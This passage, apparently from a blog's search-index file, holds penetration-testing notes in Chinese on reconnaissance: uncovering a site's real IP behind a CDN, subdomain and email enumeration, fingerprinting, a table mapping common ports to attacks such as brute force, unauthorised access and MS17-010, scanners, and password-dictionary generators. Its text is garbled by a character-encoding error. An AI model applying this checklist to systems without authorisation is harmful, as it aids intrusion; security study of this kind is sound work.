ç”µä¿¡</td><td>35ms</td><td>53ms</td><td></td></tr><tr><td>æ²³å—æ´›é˜³[å¤šçº¿]</td><td>220.181.38.148</td><td>ä¸­å›½åŒ—äº¬æµ·æ·€ ç”µä¿¡</td><td>23ms</td><td>52ms</td><td></td></tr><tr><td>æ±Ÿè‹é•‡æ±Ÿ[å¤šçº¿]</td><td>220.181.38.251</td><td>ä¸­å›½åŒ—äº¬æµ·æ·€ ç”µä¿¡</td><td>32ms</td><td>49ms</td><td></td></tr><tr><td>æ±Ÿè‹é•‡æ±Ÿ[ç”µä¿¡]</td><td>220.181.38.148</td><td>ä¸­å›½åŒ—äº¬æµ·æ·€ ç”µä¿¡</td><td>27ms</td><td>50ms</td><td></td></tr></tbody></table><h2 id="1-2-æŸ¥æ‰¾çœŸå®IP"><a href="#1-2-æŸ¥æ‰¾çœŸå®IP" class="headerlink" title="1.2 æŸ¥æ‰¾çœŸå®IP"></a>1.2 æŸ¥æ‰¾çœŸå®IP</h2><blockquote><p>Tips:æ‰¾åˆ°çœŸå®ipï¼Œç»‘å®šhostï¼Œå¯ä»¥æ‰“å¼€ç›®æ ‡ç½‘ç«™å°±æ˜¯çœŸå®ip</p></blockquote><h3 id="1-2-1-å¤§æ•°æ®ç½‘ç»œæœç´¢å¹³å°"><a href="#1-2-1-å¤§æ•°æ®ç½‘ç»œæœç´¢å¹³å°" class="headerlink" title="1.2.1 å¤§æ•°æ®ç½‘ç»œæœç´¢å¹³å°"></a>1.2.1 å¤§æ•°æ®ç½‘ç»œæœç´¢å¹³å°</h3><p><a href="https://zoomeye.org/">é’Ÿé¦—ä¹‹çœ¼</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E9%92%9F%E9%A6%97%E4%B9%8B%E7%9C%BC.png" alt="é’Ÿé¦—ä¹‹çœ¼"></p><p><a href="https://www.censys.io/">censys</a></p><p><a href="https://fofa.info/">FOFA</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/fofa.png" alt="FOFA"></p><p><a href="%5Bshodan%5D(https://www.shodan.io/)">shodan</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/shodan.png" alt="shoda"></p><h3 id="1-2-2-å†å²DNSè®°å½•"><a href="#1-2-2-å†å²DNSè®°å½•" class="headerlink" title="1.2.2 å†å²DNSè®°å½•"></a>1.2.2 å†å²DNSè®°å½•</h3><blockquote><p>æœ€æ—©è§£æçš„ipåœ°å€ä¸ºçœŸå®ipåœ°å€ï¼Œ(å¯èƒ½ä¼šå­˜åœ¨ä½¿ç”¨CDNå‰çš„ipåœ°å€)</p></blockquote><p><a href="https://dnsdb.io/zh-cn">å…¨çƒDNSæœç´¢å¼•æ“</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%85%A8%E7%90%83DNS%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E.png" alt="å…¨çƒDNSæœç´¢å¼•æ“"></p><p><a href="https://x.threatbook.cn/">æƒ…æŠ¥ç¤¾åŒº</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF.png" alt="æƒ…æŠ¥ç¤¾åŒº"></p><p><a href="https://toolbar.netcraft.com/site_report?url=">Netcraft</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Netcraft.png" alt="Netcraft"></p><p><a href="http://viewdns.info/">viewdnsinfo</a></p><p><a href="https://github.com/3xp10it/xcdn">xcdn</a></p><p><a href="http://bobao.360.cn/learning/detail/221.html">zmap</a></p><h3 id="1-2-3-ä¸»åŠ¨è¿æ¥æš´éœ²çš„çœŸå®ip"><a href="#1-2-3-ä¸»åŠ¨è¿æ¥æš´éœ²çš„çœŸå®ip" class="headerlink" title="1.2.3 ä¸»åŠ¨è¿æ¥æš´éœ²çš„çœŸå®ip"></a>1.2.3 ä¸»åŠ¨è¿æ¥æš´éœ²çš„çœŸå®ip</h3><ul><li>æ³¨å†Œç½‘ç«™é‚®ä»¶éªŒè¯(æ˜¾ç¤ºé‚®ä»¶åŸæ–‡ï¼Œfromå­—æ®µä¸ºçœŸå®ip)</li><li>RSS</li><li>è®¢é˜…ç½‘ç«™</li></ul><h3 id="1-2-4-å›½å¤–ä»£ç†è®¿é—®"><a href="#1-2-4-å›½å¤–ä»£ç†è®¿é—®" class="headerlink" title="1.2.4 å›½å¤–ä»£ç†è®¿é—®"></a>1.2.4 å›½å¤–ä»£ç†è®¿é—®</h3><p>å›½å†…çš„CDNå¾€å¾€åªé’ˆå¯¹å›½å†…ç”¨æˆ·è®¿é—®åŠ é€Ÿï¼Œæœ‰æ—¶å€™é€šè¿‡å›½å¤–çš„DNSè§£æå¯ä»¥å¾—åˆ°çœŸå®IP</p><h3 id="1-2-5-çº¯çœŸipæ•°æ®åº“"><a href="#1-2-5-çº¯çœŸipæ•°æ®åº“" class="headerlink" title="1.2.5 çº¯çœŸipæ•°æ®åº“"></a>1.2.5 çº¯çœŸipæ•°æ®åº“</h3><h2 id="1-3-IPä¿¡æ¯æ”¶é›†"><a href="#1-3-IPä¿¡æ¯æ”¶é›†" class="headerlink" title="1.3 IPä¿¡æ¯æ”¶é›†"></a>1.3 IPä¿¡æ¯æ”¶é›†</h2><h3 id="1-3-1-IP-æ®µæ•´ç†"><a href="#1-3-1-IP-æ®µæ•´ç†" class="headerlink" title="1.3.1 IP æ®µæ•´ç†"></a>1.3.1 IP æ®µæ•´ç†</h3><p><a href="https://ipwhois.cnnic.net.cn/">CNNICIP</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/ip%E6%AE%B5.png" alt="CNNICIP"></p><h3 id="1-3-2-Cæ®µã€æ—ç«™"><a href="#1-3-2-Cæ®µã€æ—ç«™" class="headerlink" title="1.3.2 Cæ®µã€æ—ç«™"></a>1.3.2 Cæ®µã€æ—ç«™</h3><p><a href="http://www.webscan.cc/">WebScan</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/WebScan.png" alt="WebScan"></p><p><a href="https://chapangzhan.com/">æŸ¥æ—ç«™</a></p><h2 id="1-4-æœç´¢å¼•æ“"><a href="#1-4-æœç´¢å¼•æ“" class="headerlink" title="1.4 æœç´¢å¼•æ“"></a>1.4 æœç´¢å¼•æ“</h2><p><a href="https://scholar.google.com.ph/">googleå­¦æœ¯</a></p><h1 id="2-åŸŸåã€å­åŸŸåæ”¶é›†"><a href="#2-åŸŸåã€å­åŸŸåæ”¶é›†" class="headerlink" title="2 åŸŸåã€å­åŸŸåæ”¶é›†"></a>2 åŸŸåã€å­åŸŸåæ”¶é›†</h1><h2 id="2-1-åŸŸåçš„å¤‡æ¡ˆå·"><a href="#2-1-åŸŸåçš„å¤‡æ¡ˆå·" class="headerlink" title="2.1 åŸŸåçš„å¤‡æ¡ˆå·"></a>2.1 åŸŸåçš„å¤‡æ¡ˆå·</h2><p><a href="icp.chinaz.com">chinaz</a></p><h2 id="2-2-å­åŸŸåå·¥å…·"><a href="#2-2-å­åŸŸåå·¥å…·" class="headerlink" title="2.2 å­åŸŸåå·¥å…·"></a>2.2 å­åŸŸåå·¥å…·</h2><ul><li>å­åŸŸåæŒ–æ˜æœºLayer</li><li>Sublist3r</li><li>oneforall</li></ul><h2 id="2-3-åœ¨çº¿å­åŸŸåæ¥å£"><a href="#2-3-åœ¨çº¿å­åŸŸåæ¥å£" class="headerlink" title="2.3 åœ¨çº¿å­åŸŸåæ¥å£"></a>2.3 åœ¨çº¿å­åŸŸåæ¥å£</h2><ol><li><a href="https://securitytrails.com/list/apex_domain">https://securitytrails.com/list/apex_domain</a></li><li><a href="http://ce.baidu.com/index/getRelatedSites">http://ce.baidu.com/index/getRelatedSites</a></li><li><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li><li><a href="https://findsubdomains.com/">https://findsubdomains.com/</a></li><li><a href="https://dnslytics.com/domain">https://dnslytics.com/domain</a></li></ol><h2 id="2-4-å…¶ä»–æ³„éœ²ä¿¡æ¯"><a href="#2-4-å…¶ä»–æ³„éœ²ä¿¡æ¯" class="headerlink" title="2.4 å…¶ä»–æ³„éœ²ä¿¡æ¯"></a>2.4 å…¶ä»–æ³„éœ²ä¿¡æ¯</h2><ol><li>crossdomain.xmlæ–‡ä»¶</li><li>çˆ¬è™«é€’å½’çˆ¬å–</li><li>DNSåŸŸä¼ é€æ¼æ´</li></ol><h2 id="2-5-SSLè¯ä¹¦æŸ¥è¯¢"><a href="#2-5-SSLè¯ä¹¦æŸ¥è¯¢" class="headerlink" title="2.5 SSLè¯ä¹¦æŸ¥è¯¢"></a>2.5 SSLè¯ä¹¦æŸ¥è¯¢</h2><ol><li>ä¸å®‰å…¨çš„ç«™ç‚¹ï¼Œæµè§ˆå™¨è¯ä¹¦ä¿¡æ¯æ³„éœ²</li><li>dnsdumpster.com</li></ol><h1 id="3-APPæ”¶é›†"><a href="#3-APPæ”¶é›†" class="headerlink" title="3 APPæ”¶é›†"></a>3 APPæ”¶é›†</h1><h2 id="3-1-appä¿¡æ¯æ”¶é›†å’Œå†å²ç‰ˆæœ¬"><a href="#3-1-appä¿¡æ¯æ”¶é›†å’Œå†å²ç‰ˆæœ¬" class="headerlink" title="3.1 appä¿¡æ¯æ”¶é›†å’Œå†å²ç‰ˆæœ¬"></a>3.1 appä¿¡æ¯æ”¶é›†å’Œå†å²ç‰ˆæœ¬</h2><ul><li>iosï¼šåŒå…¬å¸çš„å…¶ä»–äº§å“</li><li>androidï¼šé…·å®‰ã€ç¢—è±†èšç­‰</li></ul><h2 id="3-2-å·¥å…·"><a href="#3-2-å·¥å…·" class="headerlink" title="3.2 å·¥å…·"></a>3.2 å·¥å…·</h2><blockquote><p>æœªåŠ å¯†çš„appä¼šæ‰«æå‡ºå¤§é‡å¯æ³¨å…¥é“¾æ¥</p></blockquote><ul><li>appinfoscanner</li></ul><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/appinfoscanner.png" alt="appinfoscanner"></p><h1 id="4-MAILæ”¶é›†"><a href="#4-MAILæ”¶é›†" class="headerlink" title="4 MAILæ”¶é›†"></a>4 MAILæ”¶é›†</h1><p><a href="https://hunter.io/">emailçŒäººåœ¨çº¿</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%8C%8E%E4%BA%BA%E5%9C%A8%E7%BA%BF.png" alt="emailçŒäººåœ¨çº¿"></p><p><a href="https://email-format.com/i/search_result/?q=">email-format</a></p><p><img src="/img/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/email-format.png" alt="email-format"></p><h1 id="5-WEBæ”¶é›†"><a href="#5-WEBæ”¶é›†" class="headerlink" title="5 WEBæ”¶é›†"></a>5 WEBæ”¶é›†</h1><p><a href="https://github.com/ElevenPaths/FOCA">FOCA</a></p><h1 id="6-æŒ‡çº¹è¯†åˆ«"><a href="#6-æŒ‡çº¹è¯†åˆ«" class="headerlink" title="6 æŒ‡çº¹è¯†åˆ«"></a>6 æŒ‡çº¹è¯†åˆ«</h1><h2 id="6-1-ç¬¬ä¸‰æ–¹ç½‘ç«™"><a href="#6-1-ç¬¬ä¸‰æ–¹ç½‘ç«™" class="headerlink" title="6.1 ç¬¬ä¸‰æ–¹ç½‘ç«™"></a>6.1 ç¬¬ä¸‰æ–¹ç½‘ç«™</h2><p><a href="www.yunsee.cn">äº‘æ‚‰</a></p><h2 id="6-2-æµè§ˆå™¨æ’ä»¶"><a href="#6-2-æµè§ˆå™¨æ’ä»¶" class="headerlink" title="6.2 æµè§ˆå™¨æ’ä»¶"></a>6.2 æµè§ˆå™¨æ’ä»¶</h2><ul><li>wappalyzer</li></ul><h2 id="6-3-å…¶ä»–å·¥å…·"><a href="#6-3-å…¶ä»–å·¥å…·" class="headerlink" title="6.3 å…¶ä»–å·¥å…·"></a>6.3 å…¶ä»–å·¥å…·</h2><ul><li>what-web</li><li>finger</li></ul><h1 id="7-ç«¯å£è¯†åˆ«"><a href="#7-ç«¯å£è¯†åˆ«" class="headerlink" title="7 ç«¯å£è¯†åˆ«"></a>7 ç«¯å£è¯†åˆ«</h1><h2 id="7-1-å¸¸è§ç«¯å£"><a href="#7-1-å¸¸è§ç«¯å£" class="headerlink" title="7.1 å¸¸è§ç«¯å£"></a>7.1 å¸¸è§ç«¯å£</h2><table><thead><tr><th>ç«¯å£</th><th>æœåŠ¡</th><th>æ€»ç»“</th><th>æ–‡æ¡£</th></tr></thead><tbody><tr><td>21</td><td>FTP&#x2F;TFTP&#x2F;VSFTPD</td><td>çˆ†ç ´&#x2F;å—…æ¢&#x2F;æº¢å‡º&#x2F;åé—¨</td><td></td></tr><tr><td>22</td><td>SSHè¿œç¨‹è¿æ¥</td><td>çˆ†ç ´&#x2F;opensshæ¼æ´</td><td></td></tr><tr><td>23</td><td>TELNETè¿œç¨‹è¿æ¥</td><td>çˆ†ç ´&#x2F;å—…æ¢&#x2F;å¼±å£ä»¤</td><td></td></tr><tr><td>25</td><td>SMTPé‚®ä»¶æœåŠ¡</td><td>é‚®ä»¶ä¼ªé€ </td><td></td></tr><tr><td>53</td><td>DNSåŸŸåè§£æç³»ç»Ÿ</td><td>åŸŸä¼ é€&#x2F;åŠ«æŒ&#x2F;ç¼“å­˜æŠ•æ¯’&#x2F;æ¬ºéª—</td><td></td></tr><tr><td>67&#x2F;68</td><td>dhcpæœåŠ¡</td><td>åŠ«æŒ&#x2F;æ¬ºéª—</td><td></td></tr><tr><td>110</td><td>pop3</td><td>çˆ†ç ´&#x2F;å—…æ¢</td><td></td></tr><tr><td>139</td><td>sambaæœåŠ¡</td><td>çˆ†ç ´&#x2F;æœªæˆæƒè®¿é—®&#x2F;è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</td><td></td></tr><tr><td>143</td><td>Imapåè®®</td><td>çˆ†ç ´JGSNMPåè®®çˆ†ç ´&#x2F;æœé›†ç›®æ ‡å†…ç½‘ä¿¡æ¯</td><td></td></tr><tr><td>389</td><td>Ldapç›®å½•è®¿é—®åè®®</td><td>æ³¨å…¥&#x2F;æœªæˆæƒè®¿é—®&#x2F;å¼±å£ä»¤</td><td></td></tr><tr><td>445</td><td>smb</td><td>ms17-010ç«¯å£æº¢å‡º</td><td></td></tr><tr><td>512&#x2F;513&#x2F;514</td><td>Linux RexecæœåŠ¡</td><td>çˆ†ç ´&#x2F;Rloginç™»é™†</td><td></td></tr><tr><td>873</td><td>RsyxcæœåŠ¡</td><td>æ–‡ä»¶ä¸Šä¼ &#x2F;æœªæˆæƒè®¿é—®</td><td></td></tr><tr><td>1080</td><td>socket</td><td>çˆ†ç ´</td><td></td></tr><tr><td>1352</td><td>Lotus dominoé‚®ä»¶æœåŠ¡</td><td>çˆ†ç ´&#x2F;ä¿¡æ¯æ³„æ¼</td><td></td></tr><tr><td>1433</td><td>mssql</td><td>çˆ†ç ´&#x2F;æ³¨å…¥&#x2F;SAå¼±å£ä»¤</td><td></td></tr><tr><td>1521</td><td>oracle</td><td>çˆ†ç ´&#x2F;æ³¨å…¥&#x2F;TNSçˆ†ç ´&#x2F;åå¼¹shell2O49NfSæœåŠ¡é…ç½®ä¸å½“</td><td></td></tr><tr><td>2181</td><td>zookeeperæœåŠ¡</td><td>æœªæˆæƒè®¿é—®</td><td></td></tr><tr><td>2375</td><td>docker remote api</td><td>æœªæˆæƒè®¿é—®</td><td></td></tr><tr><td>3306</td><td>mysql</td><td>çˆ†ç ´&#x2F;æ³¨å…¥</td><td></td></tr><tr><td>3389</td><td>Rdpè¿œç¨‹æ¡Œé¢é“¾æ¥</td><td>çˆ†ç ´&#x2F;shfitåé—¨</td><td></td></tr><tr><td>4848</td><td>GassFishæ§åˆ¶å°</td><td>çˆ†ç ´&#x2F;è®¤è¯ç»•è¿‡</td><td></td></tr><tr><td>5000</td><td>sybase&#x2F;DB2æ•°æ®åº“</td><td>çˆ†ç ´&#x2F;æ³¨å…¥&#x2F;ææƒ</td><td></td></tr><tr><td>5432</td><td>postgresql</td><td>çˆ†ç ´&#x2F;æ³¨å…¥&#x2F;ç¼“å†²åŒºæº¢å‡º</td><td></td></tr><tr><td>5632</td><td>pcanywhereæœåŠ¡</td><td>æŠ“å¯†ç &#x2F;ä»£ç æ‰§è¡Œ</td><td></td></tr><tr><td>5900</td><td>vnc</td><td>çˆ†ç ´&#x2F;è®¤è¯ç»•è¿‡</td><td></td></tr><tr><td>6379</td><td>Redisæ•°æ®åº“</td><td>æœªæˆæƒè®¿é—®&#x2F;çˆ†ç ´</td><td></td></tr><tr><td>7001&#x2F;7002</td><td>weblogic</td><td>ååºåˆ—åŒ–&#x2F;æ§åˆ¶å°å¼±å£ä»¤</td><td></td></tr><tr><td>80&#x2F;443</td><td>http&#x2F;https</td><td>webåº”ç”¨æ¼æ´&#x2F;å¿ƒè„æ»´è¡€</td><td></td></tr><tr><td>8069</td><td>zabbixæœåŠ¡</td><td>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ&#x2F;æ³¨å…¥</td><td></td></tr><tr><td>8161</td><td>activemq</td><td>å¼±å£ä»¤&#x2F;å†™æ–‡ä»¶</td><td></td></tr><tr><td>8080&#x2F;8089</td><td>Jboss&#x2F;Tomcat&#x2F;Resin</td><td>çˆ†ç ´&#x2F;PUTæ–‡ä»¶ä¸Šä¼ &#x2F;ååºåˆ—åŒ–</td><td></td></tr><tr><td>8083&#x2F;8086</td><td>influxDB</td><td>æœªæˆæƒè®¿é—®</td><td></td></tr><tr><td>9000</td><td>fastcgi</td><td>è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</td><td></td></tr><tr><td>9090</td><td>Websphere</td><td>æ§åˆ¶å°çˆ†ç ´&#x2F;javaååºåˆ—åŒ–&#x2F;å¼±å£ä»¤</td><td></td></tr><tr><td>9200&#x2F;9300</td><td>elasticsearch</td><td>è¿œç¨‹ä»£ç æ‰§è¡Œ</td><td></td></tr><tr><td>11211</td><td>memcached</td><td>æœªæˆæƒè®¿é—®</td><td></td></tr><tr><td>27017&#x2F;27018</td><td>mongodb</td><td>æœªæˆæƒè®¿é—®&#x2F;çˆ†ç ´</td><td></td></tr></tbody></table><h2 id="7-2-æ‰«æå·¥å…·"><a href="#7-2-æ‰«æå·¥å…·" class="headerlink" title="7.2 æ‰«æå·¥å…·"></a>7.2 æ‰«æå·¥å…·</h2><ul><li>scanport</li><li>nmap</li><li>masscan</li><li>masnmapscan</li><li>zmap</li><li>å¾¡å‰‘é«˜é€ŸTCPç«¯å£æ‰«æå·¥å…·</li><li>å¾¡å‰‘é«˜é€Ÿç«¯å£æ‰«æå·¥å…·</li><li>IISPutScanner</li><li>IISPutScannerå¢å¼ºç‰ˆ-DotNetScan</li></ul><h1 id="8-å£ä»¤æ”¶é›†"><a href="#8-å£ä»¤æ”¶é›†" class="headerlink" title="8 å£ä»¤æ”¶é›†"></a>8 å£ä»¤æ”¶é›†</h1><h2 id="8-1-å¼±å£ä»¤å­—å…¸çš„ç”Ÿæˆ"><a href="#8-1-å¼±å£ä»¤å­—å…¸çš„ç”Ÿæˆ" class="headerlink" title="8.1 å¼±å£ä»¤å­—å…¸çš„ç”Ÿæˆ"></a>8.1 å¼±å£ä»¤å­—å…¸çš„ç”Ÿæˆ</h2><ul><li>é’ˆå¯¹ä¸ªäººä¿¡æ¯ç”Ÿæˆé’ˆå¯¹ä¸ªäººçš„å¯†ç å­—å…¸</li></ul><p><a href="https://www.bugku.com/mima/">CTFå¯†ç ç”Ÿæˆå™¨</a></p><ul><li>ç™½é¹¿ç¤¾å·¥å­—å…¸ç”Ÿæˆå™¨</li></ul><p><a href="https://github.com/x311/BaiLu-SED-Tool">ç™½é¹¿ç¤¾å·¥å­—å…¸ç”Ÿæˆå™¨</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>PenTest</category>
      
      <category>ä¿¡æ¯æ”¶é›†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>PenTest</tag>
      
      <tag>ä¿¡æ¯æ”¶é›†</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
